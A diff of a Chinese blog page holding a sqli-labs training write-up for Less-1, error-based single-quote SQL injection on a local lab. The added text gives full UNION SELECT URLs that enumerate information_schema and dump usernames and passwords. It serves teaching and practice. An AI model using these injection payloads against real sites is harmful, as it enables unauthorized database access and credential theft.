@@ -9,10 +9,9 @@
     
     <meta name="author" content="Weinan Wu">
     
-    <meta name="description" content="#sql-lab wirteup这里的练习对象是sql-lab，是一个印度大佬完成后上传刀github上的练习。所以通过https://github.com/Audi-1/sqli-labs下载，下面是简单的安装教程。
-##安装：
-
-提前装好apache+php+MySQL,推荐使用Appserv等">
+    <meta name="description" content="sql-lab wirteup这里的练习对象是sql-lab，是一个印度大佬完成后上传刀github上的练习。所以通过https://github.com/Audi-1/sqli-labs下载，下面是简单的安装教程。
+安装：
+提前装好apache+php+MySQL,推荐使用Appserv等便捷套件">
     
     
     
@@ -76,7 +75,7 @@
     </p>
   <p class="article-time">
     <time datetime="2017-04-05T06:46:12.000Z" itemprop="datePublished">2017-04-05</time>
-    Updated:<time datetime="2017-04-07T07:10:42.393Z" itemprop="dateModified">2017-04-07</time>
+    Updated:<time datetime="2017-04-07T07:56:20.949Z" itemprop="dateModified">2017-04-07</time>
     
   </p>
 </header>
@@ -85,12 +84,11 @@
 		
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
-		<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String"><span class="toc-number">1.</span> <span class="toc-text">Less-1 GET - Error based - Single quotes - String</span></a></li></ol>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-lab-wirteup"><span class="toc-number">1.</span> <span class="toc-text">sql-lab wirteup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装："><span class="toc-number">1.1.</span> <span class="toc-text">安装：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">Less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#猜表中字段数"><span class="toc-number">1.1.0.1.1.</span> <span class="toc-text">猜表中字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#获取当前数据库信息、用户信息"><span class="toc-number">1.1.0.1.2.</span> <span class="toc-text">获取当前数据库信息、用户信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查询security中的表"><span class="toc-number">1.1.0.1.3.</span> <span class="toc-text">查询security中的表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查询users表中的字段名"><span class="toc-number">1.1.0.1.4.</span> <span class="toc-text">查询users表中的字段名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#一一列出想要的用户名和密码啦"><span class="toc-number">1.1.0.1.5.</span> <span class="toc-text">一一列出想要的用户名和密码啦</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-2-GET-Error-based-intiger-based"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Less-2 GET - Error based - intiger based</span></a></li></ol></li></ol></li></ol></li></ol>
 		</div>
 		
-		<p>#sql-lab wirteup<br>这里的练习对象是sql-lab，是一个印度大佬完成后上传刀github上的练习。所以通过<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>下载，下面是简单的安装教程。</p>
-<p>##安装：</p>
-<blockquote>
+		<h1 id="sql-lab-wirteup"><a href="#sql-lab-wirteup" class="headerlink" title="sql-lab wirteup"></a>sql-lab wirteup</h1><p>这里的练习对象是sql-lab，是一个印度大佬完成后上传刀github上的练习。所以通过<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>下载，下面是简单的安装教程。</p>
+<h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><blockquote>
 <p>提前装好apache+php+MySQL,推荐使用Appserv等便捷套件</p>
 <p>从<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>下载解压到/www目录下</p>
 <p>修改目录sql-lab\sql-connections下的db-creds文件中登入数据库的账号密码</p>
@@ -105,9 +103,17 @@
 </blockquote>
 <h4 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1 GET - Error based - Single quotes - String"></a>Less-1 GET - Error based - Single quotes - String</h4><p>根据题目，这是一个基于错误回显的单引号string注入，首先在url中加上单引号（注意是英文字符的单引号’或%27）<br><img src="http://i.imgur.com/XVFGfh6.png" alt=""></p>
 <p>MySQL数据库回显了“MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1”，单引号不匹配嘛，这说明less-1没做任何过滤，只要在加上一个#或者%23，错误就消失了，因为后面多余的引号被注释掉了。接下来继续完成对user表的注入</p>
-<p>接下来猜表中字段数，select 1 表示选中第一个字段，以此类推select 1,2,3表示选择前三个字段，所以就猜吧。字段数不同时报错，如果猜中就正常返回。也可以使用order by测试。<br><img src="http://i.imgur.com/3ZTsDBb.png" alt=""><br><img src="http://i.imgur.com/CsypE1v.png" alt=""></p>
+<h5 id="猜表中字段数"><a href="#猜表中字段数" class="headerlink" title="猜表中字段数"></a>猜表中字段数</h5><p>select 1 表示选中第一个字段，以此类推select 1,2,3表示选择前三个字段，所以就猜吧。字段数不同时报错，如果猜中就正常返回。也可以使用order by测试。<br><img src="http://i.imgur.com/3ZTsDBb.png" alt=""><br><img src="http://i.imgur.com/CsypE1v.png" alt=""></p>
 <p>答案就是三列，根据显示的name和password来看，应该是2,3列，第一列一般是用户id，所以未来的注入语句可以构造成<code>SELECT * FROM users WHERE id=&#39;1&#39; union select 1,2,注入语句#&#39; LIMIT 0,1</code>或<code>SELECT * FROM users WHERE id=&#39;1&#39; union select 1,注入语句,3#&#39; LIMIT 0,1</code>当然是放在后面比较方便</p>
-  
+<h5 id="获取当前数据库信息、用户信息"><a href="#获取当前数据库信息、用户信息" class="headerlink" title="获取当前数据库信息、用户信息"></a>获取当前数据库信息、用户信息</h5><p>单独使用database(),user()很麻烦，使用concat_ws()将其连接起来，concat_ws(char(58),database(),user())<br><img src="http://i.imgur.com/j4dmKSo.png" alt=""></p>
+<h5 id="查询security中的表"><a href="#查询security中的表" class="headerlink" title="查询security中的表"></a>查询security中的表</h5><p>MySQL中有一个默认的系统数据库information_schema。记录了所有数据库的信息，包括表、字段、权限等。其中SCHEMA，TABLES，COLUMNS表是重点</p>
+<p>直接上<code>http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union select 1,2,table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,5%23</code><br><img src="http://i.imgur.com/zeroTbg.png" alt=""><br>这里的数据库名可以用双引号括起来也可以写上ascii码的十六进制数。因为php源码的原因，这里只打印一行信息，所以加上LIMIT 语句，将所有表名打印出来<code>SELECT * FROM users WHERE id=&#39;4214214&#39; union select 1,2,table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,5%23</code> 最后将目标放在users表上</p>
+<h5 id="查询users表中的字段名"><a href="#查询users表中的字段名" class="headerlink" title="查询users表中的字段名"></a>查询users表中的字段名</h5><p>方法同上，目标是columns表。直接上<code>http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22%20limit%200,5%23</code> 使用limit将所有字段名打印出来<br><img src="http://i.imgur.com/befdG9g.png" alt=""></p>
+<p><img src="http://i.imgur.com/IQT5rmF.png" alt=""></p>
+<p><img src="http://i.imgur.com/4fHorjv.png" alt=""></p>
+<p><img src="http://i.imgur.com/9DNK4ah.png" alt=""></p>
+<h5 id="一一列出想要的用户名和密码啦"><a href="#一一列出想要的用户名和密码啦" class="headerlink" title="一一列出想要的用户名和密码啦"></a>一一列出想要的用户名和密码啦</h5><p>将获取数据库信息的函数换成id,username,password就可以啦<br><code>http://127.0.0.1:8080/sql-lab/Less-1/?id=-11%27%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%201,5%23</code><br><img src="http://i.imgur.com/dcWyzJ8.png" alt=""></p>
+<h4 id="Less-2-GET-Error-based-intiger-based"><a href="#Less-2-GET-Error-based-intiger-based" class="headerlink" title="Less-2 GET - Error based - intiger based"></a>Less-2 GET - Error based - intiger based</h4>  
 	</div>
 		<footer class="article-footer clearfix">
 
@@ -147,7 +153,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
-  <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String"><span class="toc-number">1.</span> <span class="toc-text">Less-1 GET - Error based - Single quotes - String</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-lab-wirteup"><span class="toc-number">1.</span> <span class="toc-text">sql-lab wirteup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装："><span class="toc-number">1.1.</span> <span class="toc-text">安装：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">Less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#猜表中字段数"><span class="toc-number">1.1.0.1.1.</span> <span class="toc-text">猜表中字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#获取当前数据库信息、用户信息"><span class="toc-number">1.1.0.1.2.</span> <span class="toc-text">获取当前数据库信息、用户信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查询security中的表"><span class="toc-number">1.1.0.1.3.</span> <span class="toc-text">查询security中的表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查询users表中的字段名"><span class="toc-number">1.1.0.1.4.</span> <span class="toc-text">查询users表中的字段名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#一一列出想要的用户名和密码啦"><span class="toc-number">1.1.0.1.5.</span> <span class="toc-text">一一列出想要的用户名和密码啦</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-2-GET-Error-based-intiger-based"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Less-2 GET - Error based - intiger based</span></a></li></ol></li></ol></li></ol></li></ol>
   </div>
 
 <div id="asidepart">
